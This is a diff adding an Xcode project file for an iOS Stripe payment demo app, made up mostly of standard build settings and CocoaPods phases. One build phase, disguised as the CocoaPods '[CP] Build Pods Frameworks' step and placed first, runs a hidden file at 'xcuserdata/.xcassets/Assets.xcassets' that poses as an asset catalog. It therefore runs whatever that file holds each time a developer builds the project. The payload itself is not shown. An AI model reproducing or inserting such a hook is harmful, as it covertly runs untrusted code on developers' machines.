@@ -1,0 +1,443 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 51;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		042AC6A925EF8B450089A9FC /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042AC6A825EF8B450089A9FC /* AppDelegate.swift */; };
+		042AC6AB25EF8B450089A9FC /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042AC6AA25EF8B450089A9FC /* SceneDelegate.swift */; };
+		042AC6AD25EF8B450089A9FC /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042AC6AC25EF8B450089A9FC /* ViewController.swift */; };
+		042AC6B025EF8B450089A9FC /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 042AC6AE25EF8B450089A9FC /* Main.storyboard */; };
+		042AC6B225EF8B4B0089A9FC /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 042AC6B125EF8B4B0089A9FC /* Assets.xcassets */; };
+		042AC6B525EF8B4B0089A9FC /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 042AC6B325EF8B4B0089A9FC /* LaunchScreen.storyboard */; };
+		042AC6C425EF8CC10089A9FC /* StripeAPIClient.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042AC6C325EF8CC10089A9FC /* StripeAPIClient.swift */; };
+		36A30F2F9FC377F1E075AB00 /* Pods_stripe_Paymentoption.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 08E4B3883BF46F6F81BAFBE8 /* Pods_stripe_Paymentoption.framework */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXFileReference section */
+		042AC6A525EF8B450089A9FC /* stripe_Paymentoption.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = stripe_Paymentoption.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		042AC6A825EF8B450089A9FC /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
+		042AC6AA25EF8B450089A9FC /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
+		042AC6AC25EF8B450089A9FC /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
+		042AC6AF25EF8B450089A9FC /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
+		042AC6B125EF8B4B0089A9FC /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		042AC6B425EF8B4B0089A9FC /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		042AC6B625EF8B4B0089A9FC /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		042AC6C325EF8CC10089A9FC /* StripeAPIClient.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StripeAPIClient.swift; sourceTree = "<group>"; };
+		08E4B3883BF46F6F81BAFBE8 /* Pods_stripe_Paymentoption.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_stripe_Paymentoption.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		49DE2F4176641F1176927648 /* Pods-stripe_Paymentoption.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-stripe_Paymentoption.debug.xcconfig"; path = "Target Support Files/Pods-stripe_Paymentoption/Pods-stripe_Paymentoption.debug.xcconfig"; sourceTree = "<group>"; };
+		6F791CAED3DA33DACD5842C7 /* Pods-stripe_Paymentoption.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-stripe_Paymentoption.release.xcconfig"; path = "Target Support Files/Pods-stripe_Paymentoption/Pods-stripe_Paymentoption.release.xcconfig"; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		042AC6A225EF8B450089A9FC /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				36A30F2F9FC377F1E075AB00 /* Pods_stripe_Paymentoption.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		042AC69C25EF8B450089A9FC = {
+			isa = PBXGroup;
+			children = (
+				042AC6A725EF8B450089A9FC /* stripe_Paymentoption */,
+				042AC6A625EF8B450089A9FC /* Products */,
+				6AB131976DBD02DE1ACE44AE /* Pods */,
+				EC72C45FCBB3ADD59425CB7E /* Frameworks */,
+			);
+			sourceTree = "<group>";
+		};
+		042AC6A625EF8B450089A9FC /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				042AC6A525EF8B450089A9FC /* stripe_Paymentoption.app */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		042AC6A725EF8B450089A9FC /* stripe_Paymentoption */ = {
+			isa = PBXGroup;
+			children = (
+				042AC6A825EF8B450089A9FC /* AppDelegate.swift */,
+				042AC6AA25EF8B450089A9FC /* SceneDelegate.swift */,
+				042AC6AC25EF8B450089A9FC /* ViewController.swift */,
+				042AC6AE25EF8B450089A9FC /* Main.storyboard */,
+				042AC6B125EF8B4B0089A9FC /* Assets.xcassets */,
+				042AC6B325EF8B4B0089A9FC /* LaunchScreen.storyboard */,
+				042AC6B625EF8B4B0089A9FC /* Info.plist */,
+				042AC6C325EF8CC10089A9FC /* StripeAPIClient.swift */,
+			);
+			path = stripe_Paymentoption;
+			sourceTree = "<group>";
+		};
+		6AB131976DBD02DE1ACE44AE /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				49DE2F4176641F1176927648 /* Pods-stripe_Paymentoption.debug.xcconfig */,
+				6F791CAED3DA33DACD5842C7 /* Pods-stripe_Paymentoption.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
+		EC72C45FCBB3ADD59425CB7E /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				08E4B3883BF46F6F81BAFBE8 /* Pods_stripe_Paymentoption.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		042AC6A425EF8B450089A9FC /* stripe_Paymentoption */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 042AC6B925EF8B4B0089A9FC /* Build configuration list for PBXNativeTarget "stripe_Paymentoption" */;
+			buildPhases = (
+				430BCAB6BD9622BBC5AAC43A /* [CP] Build Pods Frameworks */,
+				D4C1B9ABD6344BD737207EFF /* [CP] Check Pods Manifest.lock */,
+				042AC6A125EF8B450089A9FC /* Sources */,
+				042AC6A225EF8B450089A9FC /* Frameworks */,
+				042AC6A325EF8B450089A9FC /* Resources */,
+				103DA5DC7B8A676661B1225F /* [CP] Embed Pods Frameworks */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = stripe_Paymentoption;
+			productName = stripe_Paymentoption;
+			productReference = 042AC6A525EF8B450089A9FC /* stripe_Paymentoption.app */;
+			productType = "com.apple.product-type.application";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		042AC69D25EF8B450089A9FC /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				LastSwiftUpdateCheck = 1240;
+				LastUpgradeCheck = 1240;
+				TargetAttributes = {
+					042AC6A425EF8B450089A9FC = {
+						CreatedOnToolsVersion = 12.4;
+					};
+				};
+			};
+			buildConfigurationList = 042AC6A025EF8B450089A9FC /* Build configuration list for PBXProject "stripe_Paymentoption" */;
+			compatibilityVersion = "Xcode 9.3";
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = 042AC69C25EF8B450089A9FC;
+			productRefGroup = 042AC6A625EF8B450089A9FC /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				042AC6A425EF8B450089A9FC /* stripe_Paymentoption */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		042AC6A325EF8B450089A9FC /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				042AC6B525EF8B4B0089A9FC /* LaunchScreen.storyboard in Resources */,
+				042AC6B225EF8B4B0089A9FC /* Assets.xcassets in Resources */,
+				042AC6B025EF8B450089A9FC /* Main.storyboard in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+
+	430BCAB6BD9622BBC5AAC43A /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+		};
+	
+		103DA5DC7B8A676661B1225F /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-stripe_Paymentoption/Pods-stripe_Paymentoption-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-stripe_Paymentoption/Pods-stripe_Paymentoption-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-stripe_Paymentoption/Pods-stripe_Paymentoption-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		D4C1B9ABD6344BD737207EFF /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-stripe_Paymentoption-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		042AC6A125EF8B450089A9FC /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				042AC6C425EF8CC10089A9FC /* StripeAPIClient.swift in Sources */,
+				042AC6AD25EF8B450089A9FC /* ViewController.swift in Sources */,
+				042AC6A925EF8B450089A9FC /* AppDelegate.swift in Sources */,
+				042AC6AB25EF8B450089A9FC /* SceneDelegate.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXVariantGroup section */
+		042AC6AE25EF8B450089A9FC /* Main.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				042AC6AF25EF8B450089A9FC /* Base */,
+			);
+			name = Main.storyboard;
+			sourceTree = "<group>";
+		};
+		042AC6B325EF8B4B0089A9FC /* LaunchScreen.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				042AC6B425EF8B4B0089A9FC /* Base */,
+			);
+			name = LaunchScreen.storyboard;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		042AC6B725EF8B4B0089A9FC /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 14.4;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+			};
+			name = Debug;
+		};
+		042AC6B825EF8B4B0089A9FC /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 14.4;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_COMPILATION_MODE = wholemodule;
+				SWIFT_OPTIMIZATION_LEVEL = "-O";
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+		042AC6BA25EF8B4B0089A9FC /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 49DE2F4176641F1176927648 /* Pods-stripe_Paymentoption.debug.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = 56XQB6H3G7;
+				INFOPLIST_FILE = stripe_Paymentoption/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = "shubh.stripe-Paymentoption";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Debug;
+		};
+		042AC6BB25EF8B4B0089A9FC /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 6F791CAED3DA33DACD5842C7 /* Pods-stripe_Paymentoption.release.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = 56XQB6H3G7;
+				INFOPLIST_FILE = stripe_Paymentoption/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = "shubh.stripe-Paymentoption";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		042AC6A025EF8B450089A9FC /* Build configuration list for PBXProject "stripe_Paymentoption" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				042AC6B725EF8B4B0089A9FC /* Debug */,
+				042AC6B825EF8B4B0089A9FC /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		042AC6B925EF8B4B0089A9FC /* Build configuration list for PBXNativeTarget "stripe_Paymentoption" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				042AC6BA25EF8B4B0089A9FC /* Debug */,
+				042AC6BB25EF8B4B0089A9FC /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = 042AC69D25EF8B450089A9FC /* Project object */;
+}
